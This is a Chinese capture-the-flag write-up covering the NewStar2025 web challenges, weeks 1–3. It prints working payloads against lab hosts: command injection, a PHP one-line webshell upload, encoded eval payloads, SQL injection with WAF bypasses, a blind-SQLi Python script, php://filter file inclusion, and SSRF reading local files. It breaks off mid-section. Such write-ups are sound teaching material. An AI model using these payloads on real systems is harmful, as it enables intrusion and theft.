---
title: NewStar2025 WEB方向全解
description: 感觉拖了好久才写完的。
date: 2026-06-14 15:11:19
updated: 2026-06-14 15:11:19
image: https://img.yanxisishi.top/images/2026/06/c83dffa41da73559cd8dbc0ef0e3a1d1_720.png
categories: [CTF]
tags: [CTF, WP, newstar2025]
---

## WEEK 1

### 黑客小 W 的故事（1）

1. 第一关 `/hunt` 提示抓包，用 bp 抓包把 `count` 修改成 800 后放行即可：

   ![image-20260505230541583](https://img.yanxisishi.top/images/2026/06/image-20260505230541583.png)

2. 第二关 `/talkToMushroom` 提示：

   ```txt
   跟他提一下 guding 试试看
   ```

   以及另一个提示：

   ```txt
   需要在 get 参数的 shipin 里传入 “蘑菇孢子(mogubaozi)”
   ```

   GET 传入：

   ```http
   ?shipin=mogubaozi
   ```

   与蘑菇先生交谈后提示：

   ```txt
   你想对我说什么呢？用 POST 的方法告诉我吧
   ```

   再 POST 传入：

   ```http
   POST=guding
   ```

   再次提示：

   ```txt
   这样吧，你用 DELETE 的方法把我身上的虫子(chongzi)都弄掉，我就把骨钉给你
   ```

   在 bp 中如下传入：

   ![image-20260505231508040](https://img.yanxisishi.top/images/2026/06/image-20260505231508040.png)

   返回聊天，再次传入：

   ```http
   ?shipin=mogubaozi
   POST: POST=guding
   ```

   返回路径 `/Level2_END` ，访问即可。

3. 第三关 `/Level3_Sh3O` 提示要修改 `User-Agent` ，且提示：

   ```txt
   你的旋风斩(CycloneSlash)呢？使出来吧！
   ```

   直接把 `User-Agent` 改成 `CycloneSlash` 会返回：

   ```txt
   光说不干假把式，从哪学来的盗版货？！
   ```

   应该是需要版本号，把 `User-Agent` 改成 `CycloneSlash/5.0` ，出现新提示：

   ```txt
   你的冲锋斩(DashSlash)呢？使出来吧！
   ```

   把 `User-Agent` 改成 `CycloneSlash/5.0,DashSlash/5.0` ，得到最终路径 `/Level4_Sly` ，访问后得到 flag。

### 别笑，你也过不了第二关

查看源码，找到关键（一般找 `fetch`）：

```js
fetch("/flag.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: formData.toString()
})
```

说明访问 `/flag.php` 并传入特定的 POST 请求就可以拿到 flag。

查找对象 `formData` ，定位：

```js
if (score >= targetScores[currentLevel]) {
    alert(`恭喜通过第 ${currentLevel + 1} 关！得分: ${score}`);
    currentLevel++;
    if (currentLevel < targetScores.length) {
      // 下一关
      resetLevel(currentLevel);
      startGame();
    } else {
      // 全部通关
      gameEnded = true;
      const formData = new URLSearchParams();
formData.append("score", score);
```

说明如果 `score` 的值大于等于 `targetScores.length` 就会向 `formData` 对象中追加一条键值对数据（即传入 score=【值】）。

找 `targetScores` 找到：

```js
let targetScores = [30, 1000000]; // 每关目标分数
```

所以只需要访问 `/flag.php` 并 POST 传入：

```http
score=1000000
```

即可拿到 flag。

### 我真得控制你了

禁用了 F12 和 ctrl + u ，没啥用，访问 `view-source:http://docker.qingcen.net:47302/` 就能查看源码。

或者如图打开开发者工具：

![image-20260506191108528](https://img.yanxisishi.top/images/2026/06/image-20260506191108528.png)

找到关键：

```html
<form id="nextLevelForm" method="POST" action="next-level.php">
    <input type="hidden" name="access" value="1">
    <input type="hidden" name="csrf_token" value="12e6c3fdac134abfda4aa2b3fb5767758e0b8cf61ab24b0da6323beff05dbfdb">
</form>
```

所以访问 `/next-level.php` 同时 POST 传入：

```http
access=1&csrf_token=12e6c3fdac134abfda4aa2b3fb5767758e0b8cf61ab24b0da6323beff05dbfdb
```

就能进入下一关。

进去后页面是个账号密码认证框，提示是：

```txt
太弱了，太弱了！！
弱口令是什么东西？
```

进行弱密码爆破，得到是 `admin/111111` 。

进去后又是个新页面，给出了源码：

```php
<?php
error_reporting(0);

function generate_dynamic_flag($secret) {
    return getenv("ICQ_FLAG") ?: 'default_flag';
}


if (isset($_GET['newstar'])) {
    $input = $_GET['newstar'];
    
    if (is_array($input)) {
        die("恭喜掌握新姿势");
    }
    

    if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }
    

    if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }
    
    $test = 0;
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }
    
    if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "<div class='success'>拿下flag！</div>";
        echo "<div class='flag-container'><div class='flag'>FLAG: {$flag}</div></div>";
    } else {
        echo "<div class='error'>大哥哥泥把数字算错了: $test ≠ 2025</div>";
    }
} else {
    ?>
<?php } ?>
```

分析源码：

```php
if (is_array($input)) {
    die("恭喜掌握新姿势");
}
```

说明传进去的值不能是数组。

```php
if (preg_match('/[^\d*\/~()\s]/', $input)) {
    die("老套路了，行不行啊");
}
```

说明传进去的值只能包含：

- `\d`：数字 (0-9)
- `*`：乘号
- `/`：除号
- `~`：按位取反符号
- `()`：左右小括号
- `\s`：空格

```php
if (preg_match('/^[\d\s]+$/', $input)) {
    die("请输入有效的表达式");
}
```

检查输入是否只包含数字和空格，如果是的话就失效。

```php
try {
    @eval("\$test = $input;");
} catch (Error $e) {
    die("表达式错误");
}
```

```php
if ($test == 2025)
```

GET 传入的 newstar 的值经过 `eval` 处理后要等于 2025，经 `eval` 处理相当于把传入内容当作真正的 PHP 代码来运行。

所以只需要传入：

```http
?newstar=45*45
```

值得一提的是如果没有了 `eval()` 的执行，这题应该无解。如果版本是 PHP 7 的话，可以传入 `?newstar=2025*` ，由于是使用 `==` 进行比较，可以成功绕过；但是在 PHP 8 中，官方修复了这个弱类型比较机制。这题的环境就是 PHP 8。

## WEEK 2

### 真的是签到诶

```php
<?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?>
```

源码逻辑是将 POST 传入的 cipher 的值依次进行：

1. `base64_decode`：Base64 解码。
2. `atbash`：埃特巴什码（字母表首尾镜像替换，`A<->Z`，`b<->y`）。
3. `str_replace`：去除所有空格。
4. `str_rot13`：ROT13 替换。

所以只需要把要传入的代码反过来处理就行了，即 **ROT13 -> Atbash -> Base64 Encode**，还有 payload 里面不要出现空格即可：

```txt
system('cat${IFS}$9/flag');
flfgrz('png${VSF}$9/synt');
uoutia('kmt${EHU}$9/hbmg');
dW91dGlhKCdrbXQke0VIVX0kOS9oYm1nJyk7
```

所以 POST 传入：

```http
cipher=dW91dGlhKCdrbXQke0VIVX0kOS9oYm1nJyk7
```

### 搞点哦润吉吃吃🍊

查看源码找到：

```html
<!-- 唔...这个密码有点难记，但是我已经记好了 Doro/Doro_nJlPVs_@123 -->
```

登录进去，是一个验证界面，提示：

```txt
Doro的一些提示
1. 点击"开始验证"获取验证表达式
2. 使用表达式计算token值并在3秒内提交
3. 表达式格式：token = (int(time.time()) * multiplier) ^ xor_value
emmm... doro觉得抓包看看也许会发现这个系统的逻辑
```

有时间限制，但我不会写脚本，源码喂 AI 大人生成的 JS 脚本：

```js
let e = (await(await fetch('/start_challenge', {method: 'POST'})).json()).expression;
let [t, m, x] = e.match(/0x[a-f0-9]+|\d+/ig).map(BigInt);
console.log(await(await fetch('/verify_token', {method: 'POST', headers: {'content-type': 'application/json'}, body: `{"token":${t*m^x}}`})).json());
```

### DD 加速器

可以 ping，先传入：

```bash
127.0.0.1;cat /flag
```

返回 `flag{not_here!}`，说明 flag 不在这里，找一下：

```bash
127.0.0.1;find / -name "*flag*" 2>/dev/null
```

返回 `目标地址长度超过限制`，那就缩短一下 payload：

```bash
0;find / -name "*flag*" 2>&-
```

返回结果的最底下找到：

```txt
/flag
/.z9d344d4pj7lyxkcwcnf2lum83pchs0p/flag
```

直接读取真 flag：

```bash
0;cat /.z9d344d4pj7lyxkcwcnf2lum83pchs0p/flag
```

但又返回了 `目标地址长度超过限制`，用通配符缩短一下：

```bash
0;cat /.z*/flag
```

得到 flag。

但预期解好像是传入：

```bash
0;ls / -a
```

返回：

```txt
.
..
.dockerenv
.z9d344d4pj7lyxkcwcnf2lum83pchs0p
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

找到根目录下的隐藏目录 `.z9d344d4pj7lyxkcwcnf2lum83pchs0p`。

### 白帽小 K 的故事（1）

先上传一个一句话木马 `<?php eval($_POST[1]);?>` 制作的 1.mp3，同时抓包，改名为 1.php：

![image-20260506200217759](https://img.yanxisishi.top/images/2026/06/image-20260506200217759.png)

上传是成功了，但是不知道回显路径在哪。

回到页面，查看源码，找到：

```js
try {
    const res = await fetch('/v1/upload', {
        method: 'POST',
        body: formData
    });
```

和：

```js
try {
    const res = await fetch('/v1/onload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `file=${encodeURIComponent(file)}`
    });
```

这两个可疑路径，一个是 `/v1/upload`，这是上传文件路径，另一个是 `/v1/onload`，这是文件所在路径。

所以只需要访问 `/v1/onload` 并 POST 传入：

```http
file=1.php&1=system('cat /flag');
```

就可以拿到 flag。

### 小 E 的管理系统

题目描述已指出该题为 sql 注入，现在先测试是什么类型的闭合方式，输入：

```sql
1'
```

返回 `防火墙策略阻止访问`，说明引号 `'` 被 waf 过滤了，先测试数值型 sql 注入：

```sql
1 and 1=1
```

依旧返回 `防火墙策略阻止访问`，是过滤了空格和 `=`。

改用 BurpSuite 传参，抓包后传入：

```sql
1%0aand%0a2>1
```

返回正常查询结果：

```json
[{"id":1,"cpu":"23%","ram":"45%","status":"Online","lastChecked":"2026-05-26 01:57:40"}]
```

但传入：

```sql
1%0aand%0a2<1
```

返回结果为空。

说明本题存在数值型 sql 注入，优先采用 Union 联合查询注入：

1. 测列数

   这里是数值型 sql 注入，payload 后面不需特意接上注释。

   传入：

   ```sql
   1%0aorder%0aby%0a5
   ```

   返回正常查询结果。

   传入：

   ```sql
   1%0aorder%0aby%0a6
   ```

   报错。

   说明共 5 列。

2. 测回显位

   传入：

   ```sql
   -1%0aunion%0aselect%0a1,2,3,4,5
   ```

   返回 `Firewall blocked`，这里是逗号 `,` 也被过滤了，可以改成用 `join` 拼列：

   ```sql
   -1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d%0ajoin%0a(select%0a5)e
   ```

   还原成 SQL 是：

   ```sql
   -1
   union
   select
   *
   from
   (select 1)a
   join
   (select 2)b
   join
   (select 3)c
   join
   (select 4)d
   join
   (select 5)e
   ```

   + `join` 在 SQL 里是连接表用的，可以把多个一列表拼成一个多列表。

     比如：

     ```sql
     select * from (select 1)a
     ```

     结果是一行一列：

     ```txt
     1
     ```

     再加一个：

     ```sql
     select * from (select 1)a join (select 2)b
     ```

     结果就变成一行两列：

     ```txt
     1    2
     ```

   返回：

   ```json
   [{"id":1,"cpu":2,"ram":3,"status":4,"lastChecked":5}]
   ```

   说明每一列都是回显位。

3. 爆库名（失败）
   ```sql
   -1%0aunion%0aselect%0a*%0afrom%0a(select%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d%0ajoin%0a(select%0a5)e
   ```

   还原成 SQL 是：

   ```sql
   -1
   union
   select
   *
   from
   (select
   group_concat(schema_name)
   from
   information_schema.schemata)a
   join
   (select 2)b
   join
   (select 3)c
   join
   (select 4)d
   join
   (select 5)e
   ```

   但报错了，返回：

   ```txt
   "error":"database error: Unable to prepare statement: no such table: information_schema.schemata"
   ```

   说明后端不是 MySQL，试试 SQLite，但 SQLite 没有库名，可以跳到下一步。

4. 爆建表语句

   SQLite 里有一个系统表：

   ```txt
   sqlite_master
   ```

   它专门记录当前数据库里有哪些表、索引、触发器等对象。

   它常见字段大概是：

   ```txt
   type      对象类型，比如 table / index
   name      对象名字
   tbl_name  这个对象属于哪张表
   sql       创建这个对象时用的 SQL 语句
   ```

   所以：

   ```
   select group_concat(sql) from sqlite_master
   ```

   爆的是所有表的建表语句。

   传入：

   ```sql
   -1%0aunion%0aselect%0a*%0afrom%0a(select%0agroup_concat(sql)%0afrom%0asqlite_master)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d%0ajoin%0a(select%0a5)e
   ```

   还原成 SQL 是：

   ```sql
   -1
   union
   select
   *
   from
   (select
   group_concat(sql)
   from
   sqlite_master)a
   join
   (select 2)b
   join
   (select 3)c
   join
   (select 4)d
   join
   (select 5)e
   ```

   返回结果有：

   ```sql
   CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n),CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n),CREATE TABLE sqlite_sequence(name,seq)
   ```

   主要看到 `CREATE TABLE` 创建了三张表：

   1. `node_status` 的结构是：

      ```sql
      CREATE TABLE node_status (
          node_id INTEGER PRIMARY KEY,
          cpu_usage VARCHAR(10),
          ram_usage VARCHAR(10),
          status VARCHAR(15),
          last_checked DATETIME DEFAULT CURRENT_TIMESTAMP
      )
      ```

   2. `sys_config` 的结构是：

      ```sql
      CREATE TABLE sys_config (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          config_key VARCHAR(50) UNIQUE,
          config_value TEXT
      )
      ```

   3. `sqlite_sequence` 是 SQLite 自动生成的系统表，一般没 flag。

5. 爆 `sys_config` 的 `config_value` 列

   ```sql
   -1%0aunion%0aselect%0a*%0afrom%0a(select%0agroup_concat(config_value)%0afrom%0asys_config)a%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)c%0ajoin%0a(select%0a4)d%0ajoin%0a(select%0a5)e
   ```

   还原成 SQL 是：

   ```sql
   -1
   union
   select
   *
   from
   (select
   group_concat(config_value)
   from
   sys_config)a
   join
   (select 2)b
   join
   (select 3)c
   join
   (select 4)d
   join
   (select 5)e
   ```

   返回结果拿到 flag。

## WEEK 3

### 小 E 的秘密计划

扫目录扫到了 `/www.zip` ，访问 `/www.zip` 拿到 `www/public-555edc76-9621-4997-86b9-01483a50293e/login.php`：

```php
<?php
require_once 'user.php';
$userData = getUserData();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $userData['username'] && $password === $userData['password']) {
        header('Location: /secret-xxxxxxxxxxxxxxxxxxx');
        exit();
    } else {
        echo '登录失败,在git里找找吧';
        exit();
    }
}
```

> `require_once 'user.php';`
>
> **把当前目录下的 `user.php` 文件引入进来，而且只引入一次。**

提示 `登录失败,在git里找找吧` ，在当前目录打开命令行，Git 挖账号密码流程：

1. 先拿到源码（常见入口：/www.zip、/.git 泄露）。

2. 进入含 .git 的目录，先看当前历史：

   ```bash
   git log --oneline --all --decorate --graph
   ```

3. 重点看“曾经存在过”的历史：

   ```bash
   git reflog --all
   ```

   被删分支、切换记录都在这。

4. 找可疑提交（如“测试”“临时”“删除提示”），看改动：

   ```bash
   git show <commit>
   ```

5. 如果某提交新增了敏感文件，直接读历史版本：

   ```bash
   git show <commit>:<file>
   ```

6. 全历史关键词搜敏感信息：

   ```bash
   git log -p --all | rg -ni 'pass|password|pwd|secret|token|key|admin|flag'
   ```

7. 再补查隐藏来源：

   ```bash
   git stash list
   git tag
   git branch -a
   git fsck --lost-found
   ```

例如本题：

1. 先看当前历史：

   ```bash
   git log --oneline --all --decorate --graph
   ```

   返回：

   ```txt
   * 5fef682 (HEAD -> master) 删除提示
   * 5f8ecc0 新增提示
   * 1389b47 初始化
   ```

2. 看曾经存在过的历史：

   ```bash
   git reflog --all
   ```

   返回：

   ```txt
   5fef682 (HEAD -> master) refs/heads/master@{0}: commit: 删除提示
   5fef682 (HEAD -> master) HEAD@{0}: commit: 删除提示
   5f8ecc0 refs/heads/master@{1}: commit: 新增提示
   5f8ecc0 HEAD@{1}: commit: 新增提示
   1389b47 HEAD@{2}: checkout: moving from test to master
   353b98f HEAD@{3}: commit: 测试，这个branch会删
   1389b47 HEAD@{4}: checkout: moving from master to test
   1389b47 refs/heads/master@{2}: commit (initial): 初始化
   1389b47 HEAD@{5}: commit (initial): 初始化
   ```

   找到可疑提交 `353b98f HEAD@{3}: commit: 测试，这个branch会删` ，且这个提交在当前历史已经没有了。

3. 查看可疑提交的改动：

   ```bash
   git show 353b98f
   ```

   返回：

   ```txt
   commit 353b98f7c2fe77a5a426bf73576f5113820c4669
   Author: admin <admin@admin.com>
   Date:   Wed Oct 1 12:11:48 2025 +0800
   
       测试，这个branch会删
   
   A       user.php
   ```

   发现该次提交中出现了关键文件 `user.php`。

4. 看这个提交里的 `user.php`：

   ```bash
   git show 353b98f:user.php
   ```

   返回：

   ```php
   <?php
   
   function getUserData() {
       return [
           'username' => 'admin',
           'password' => 'f75cc3eb-21e0-4713-9c30-998a8edb13de'
       ];
   }
   ```

   成功得到了账号密码。

接着访问 `/public-555edc76-9621-4997-86b9-01483a50293e/login.php` ，同时 POST 传入：

```http
username=admin&password=f75cc3eb-21e0-4713-9c30-998a8edb13de
```

得到地址 `/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50` ，访问后来到系统控制面板，提示：

```txt
小E拿mac写的这段代码。这会泄露什么吗？
```

在终端输入：

```bash
curl -O http://docker.qingcen.net:46812/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store
```

得到泄露的二进制文件 `.DS_Store`，接着用 strings 命令得到有用信息：

```bash
# 普通 ASCII
strings -a .DS_Store
# 扩展单字节字符
strings -a -e S .DS_Store
# UTF-16BE
strings -a -e b .DS_Store
# UTF-16LE
strings -a -e l .DS_Store
# UTF-32BE
strings -a -e B .DS_Store
# UTF-32LE
strings -a -e L .DS_Store
```

只有：

```bash
# UTF-16BE
strings -a -e b .DS_Store
```

这个返回 `ffffllllaaaagggg114514` 是看着最对味的结果，访问 `/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514` 得到 flag。

### ez-chain

```php
<?php
header('Content-Type: text/html; charset=utf-8');
function filter($file) {
    $waf = array('/',':','php','base64','data','zip','rar','filter','flag');
    foreach ($waf as $waf_word) {
        if (stripos($file, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    return true;
}

function filter_output($data) {
    $waf = array('f');
    foreach ($waf as $waf_word) {
        if (stripos($data, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    while (true) {
        $decoded = base64_decode($data, true);
        if ($decoded === false || $decoded === $data) {
            break;
        }
        $data = $decoded;
    }
    foreach ($waf as $waf_word) {
        if (stripos($data, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    return true;
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (filter($file) !== true) {
        die();
    }
    $file = urldecode($file);
    $data = file_get_contents($file);
    if (filter_output($data) !== true) {
        die();
    }
    echo $data;
}
highlight_file(__FILE__);

?>
```

1. **`filter($file)` 输入过滤漏洞**

   核心在：

   ```php
   function filter($file) {
       $waf = array('/',':','php','base64','data','zip','rar','filter','flag');
       foreach ($waf as $waf_word) {
           if (stripos($file, $waf_word) !== false) {
               echo "waf:".$waf_word;
               return false;
           }
       }
       return true;
   }
   ```

   和：

   ```php
   if (isset($_GET['file'])) {
       $file = $_GET['file'];
       if (filter($file) !== true) {
           die();
       }
       $file = urldecode($file);
       $data = file_get_contents($file);
       // ...
   }
   ```

   `filter($file)` 会拦截 `php`, `flag`, `/`, `:`, `filter` 等进行本地文件包含或伪协议利用必须用到的关键字。 

   但是 `$file = urldecode($file);` 这行代码可以实现二次 URL 编码绕过，例如传入：

   ```txt
   %2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2572%2565%2561%2564%253D%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2565%256E%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2566%256C%2561%2567%252E%2570%2568%2570
   ```

   即 `php://filter/read=convert.base64-encode/resource=flag.php` 的二次 URL 编码。

2. **`filter_output($data)` 输出过滤漏洞**

   核心在：

   ```php
   function filter_output($data) {
       $waf = array('f');
       foreach ($waf as $waf_word) {
           if (stripos($data, $waf_word) !== false) {
               echo "waf:".$waf_word;
               return false;
           }
       }
       while (true) {
           $decoded = base64_decode($data, true);
           if ($decoded === false || $decoded === $data) {
               break;
           }
           $data = $decoded;
       }
       foreach ($waf as $waf_word) {
           if (stripos($data, $waf_word) !== false) {
               echo "waf:".$waf_word;
               return false;
           }
       }
       return true;
   }
   ```

   说明对输出内容拦截任何包含字母 `f`（大小写不敏感）的数据，并且防范了利用多层 Base64 编码来隐藏关键字的绕过手法。

   因此放弃使用 `convert.base64-encode` 的过滤器。

这里采用的过滤器是 `string.rot13`，payload 为：

```http
?file=php://filter/read=string.rot13/resource=/flag
```

两次 URL 编码后为：

```http
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%32%25%36%35%25%36%31%25%36%34%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37
```

注意这里**要用 Hackbar 的 URL encode (all characters)**，因为常用的 URL Encode 遵循 RFC 3986 标准，英文字母（a-z, A-Z）和数字（0-9）被定义为未保留字符，不会进行百分号编码转换。

![image-20260506232011242](https://img.yanxisishi.top/images/2026/06/image-20260506232011242.png)

这里运气好，flag 里面没有字符 `s`，所以直接拿到了 rot13 编码后的 flag。

更稳的做法是用 `convert.iconv.*` 系列过滤器，将数据转换为 EBCDIC 编码体系（如 CP037 或 IBM500）。

例如 payload 为：

```http
?file=php://filter/read=convert.iconv.UTF8.CP037/resource=/flag
```

双重 URL 编码后为：

```http
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%32%25%36%35%25%36%31%25%36%34%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%39%25%36%33%25%36%66%25%36%65%25%37%36%25%32%65%25%35%35%25%35%34%25%34%36%25%33%38%25%32%65%25%34%33%25%35%30%25%33%30%25%33%33%25%33%37%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37
```

但是这里不能用 Hackbar 或者浏览器传参，不然只能得到乱码，要用 bp 传：

![image-20260506235218104](https://img.yanxisishi.top/images/2026/06/image-20260506235218104.png)

复制得到：

```txt
Àó÷÷øñ`óõ÷`ôñ`ø÷õ÷`òöùù÷ùøøðÐ%
```

这里可以用 Cyberchef 的 Decode text，选择 IBM EBCDIC US-Canada(37)，拿到 flag：

![image-20260506235447823](https://img.yanxisishi.top/images/2026/06/image-20260506235447823.png)

或者图省事，直接用随波逐流一键解码：

![image-20260506235548516](https://img.yanxisishi.top/images/2026/06/image-20260506235548516.png)

### mirror_gate

题目提示：

```txt
请设法找出他系统中的应用配置缺陷，突破上传限制。
```

查看源码：

```html
<!-- flag is in flag.php -->
<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->
```

`c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw==` 即 `something_is_in_/uploads/`。

结合题目提示以及该题中间件为 Apache，访问 `/uploads/.htaccess`，返回：

```htaccess
AddType application/x-httpd-php .webp
```

说明上传 `.webp` 后缀的文件会被当 PHP 文件执行。

上传 `<?php eval($_POST[1]);?>` 内容的 1.webp 但被拦截了，返回：

```txt
文件内容存在安全风险，无法上传
```

说明过滤了文件内容，经测试，过滤了 `<?php`、`eval`、`system` 等等，但可以上传：

```php
<?=`tac /flag.php`?> 
```

![image-20260507001835250](https://img.yanxisishi.top/images/2026/06/image-20260507001835250.png)

上传是成功了，但不知道上传后文件所在路径，实际上就在响应源码中，由于知道上传后文件所在路径一定在 `/uploads/` 底下，查找 `uploads` 就能找到：

![image-20260507001853391](https://img.yanxisishi.top/images/2026/06/image-20260507001853391.png)

接着访问 `/uploads/20260506_161818_1.webp` 得到 flag。

### MyGO!!!

查看源码：

![image-20260507002816189](https://img.yanxisishi.top/images/2026/06/image-20260507002816189.png)
只有 flag 的 url 是 `???`，不出意料应该是 SSRF，但虽是这么说，也没有地方传数据，可以用 dirsearch 扫个目录和用 arjun 扫个参数。

扫到了文件 flag.php（但是是 403） 和参数 proxy，访问 `/flag.php` 返回：

```php
你是外地人，我只要"本地"人
```

请求头加上：

```http
X-Forwarded-For:127.0.0.1
```

但没用，改了挺多种回环地址也没有用。

查看源码找找刚刚扫到的 `proxy` ，定位到：

```js
player.src = `index.php?proxy=${encodeURIComponent(url)}`;
```

说明可以用这个参数访问本地文件，传入：

```http
?proxy=http://localhost/flag.php
```

成功得到源码：

```php
<?php
$client_ip = $_SERVER['REMOTE_ADDR'];

// 只允许本地访问
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {
    header('HTTP/1.1 403 Forbidden');
    echo "你是外地人，我只要\"本地\"人";
    exit;
}

highlight_file(__FILE__);
if (isset($_GET['soyorin'])) {
    $url = $_GET['soyorin'];

    echo "flag在根目录";
    // 普通请求
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); // 直接输出给浏览器
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);
    curl_exec($ch);
    curl_close($ch);
    exit;
}
?>
```

就是一个简单的 SSRF，用伪协议读取 `/flag`，传入：

```http
?proxy=http://localhost/flag.php?soyorin=file:///flag
```

### 白帽小 K 的故事（2）

提示中提到盲注，以及后端查询逻辑是：

```sql
SELECT 1 from Terra.animal WHERE name = '$name'
```

先测试一下，输入：

```sql
amiya
```

返回：

```txt
找到了！
干员: amiya
```

输入：

```sql
111
```

返回：

```txt
并没有这种干员
搜索: 111
```

但是输入：

```sql
amiya' and 1=1#
```

却返回：

```txt
并没有这种干员
搜索: amiya' and 1=1#
```

这里是因为题目做了过滤，可以在传入 `amiya' and 1=1#` 时抓个包，可以看到返回结果有：

```json
{"status":"error","message":"Invalid characters detected"}
```

![image-20260527133346341](https://img.yanxisishi.top/images/2026/06/image-20260527133346341.png)

~~在这卡了段时间居然没想到是过滤了，这个故事告诉我们要勤抓包。~~

经测试是过滤了空格、`%0a` 等特殊不可见字符和 `/`，可以用小括号绕过空格，输入：

```http
name=amiya'and(1=1)%23
```

返回：

```json
{"status":"ok","message":"Found"}
```

输入：

```http
name=amiya'and(1=1)%23
```

返回：

```json
{"status":"error","message":"Not Found"}
```

所以可以在 `/search` 路径下用 POST 请求方式进行布尔盲注，编写 exp 脚本：

```python
import requests

url = "http://docker.qingcen.net:42575/search"
result = ""

for i in range(1, 100):
    left = 32
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆所有数据库名，得到 mysql,information_schema,performance_schema,sys,Terra,Flag
        # payload = f"amiya'and(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{i},1))>{mid})#"

        # 爆 Flag 库的表名，得到 flag
        # payload = f"amiya'and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='Flag')),{i},1))>{mid})#"

        # 爆 flag 表的列名，得到 flag
        # payload = f"amiya'and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema='Flag')and(table_name='flag')),{i},1))>{mid})#"

        # 爆 flag 数据，得到 flag{906c33e0-7c77-4022-a51e-8417989b82de}
        payload = f"amiya'and(ascii(substr((select(group_concat(flag))from(Flag.flag)),{i},1))>{mid})#"

        res = requests.post(url, data={"name": payload})

        if "ok" in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 32:
        result += chr(left)
        print(result)
    else:
        break
```

### who'ssti

题目给了源码，代码审计：

1. **看路由**

   ```python
   @app.route('/', methods=["GET", "POST"])
   ```

   只有一个根目录 `/`  的路由，同时支持 `GET` 和 `POST`。

2. **看注入点**

   ```python
   submit = request.form.get('submit')
   if submit:
     sys.settrace(trace_calls)
     print(render_template_string(submit))
     sys.settrace(None)
   ```

   这里先获取 POST 传入的 `submit` 参数：

   ```python
   submit = request.form.get('submit')
   ```

   如果 `submit` 存在，就会执行：

   ```python
   sys.settrace(trace_calls)
   print(render_template_string(submit))
   sys.settrace(None)
   ```

   > **sys.settrace()**
   >
